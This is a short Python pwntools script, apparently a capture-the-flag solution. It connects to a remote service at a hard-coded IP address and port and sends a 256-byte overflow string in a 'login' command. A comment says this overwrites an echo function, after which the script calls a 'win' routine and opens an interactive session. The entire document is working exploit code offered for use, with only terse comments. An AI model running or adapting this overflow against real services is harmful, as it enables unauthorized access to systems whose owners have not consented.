#/usr/bin/python2

from pwn import *

io = remote('13.36.37.184',9092)

bytes = 'a'*256

#sending the required param
io.sendline("xor x0 4919")

#over write the echo function
io.sendline("login "+bytes+"win")
io.sendline("regs")
io.sendline("call win")
io.send("\n")

#making the output interactive
io.interactive()
io.close()
